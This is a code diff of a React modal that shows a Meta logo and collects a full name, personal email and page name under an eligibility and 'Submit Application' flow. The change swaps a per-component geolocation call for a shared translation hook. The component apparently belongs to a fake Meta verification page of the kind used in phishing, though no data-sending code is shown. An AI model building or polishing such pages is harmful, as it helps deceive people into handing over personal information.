@@ -2,12 +2,12 @@
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
+import { useTranslation } from '@/hooks/useTranslation';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import Image from 'next/image';
-import { type ChangeEvent, type FC, type FormEvent, useCallback, useState, useEffect } from 'react';
+import { type ChangeEvent, type FC, type FormEvent, useCallback, useState } from 'react';
 
 interface VerifyFormData {
     fullName: string;
@@ -36,25 +36,18 @@ const VerifyInfoModal: FC<VerifyInfoModalProps> = ({ nextStep }) => {
     });
 
     const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
-    const [translations, setTranslations] = useState<Record<string, string>>({});
-
-    useEffect(() => {
-        const init = async () => {
-            try {
-                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
-                const cc = (data.country_code || 'US').toLowerCase();
-                const lang = COUNTRY_TO_LANGUAGE[cc] || 'en';
-                if (lang !== 'en') {
-                    setTranslations(getTranslations(lang) || {});
-                }
-            } catch {
-                // fallback to English
-            }
-        };
-        init();
-    }, []);
-
-    const t = (text: string): string => translations[text] || text;
+    
+    // Shared translation hook - uses geoInfo from store (no redundant geo API call)
+    const { t } = useTranslation([
+        'Confirm Page Information',
+        'Your page meets the eligibility requirements',
+        'Submit Application',
+        'Under Review',
+        'Full Name',
+        'Personal Email',
+        'Page Name',
+        'Submit',
+    ]);
 
     const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
         const { name, value } = e.target;
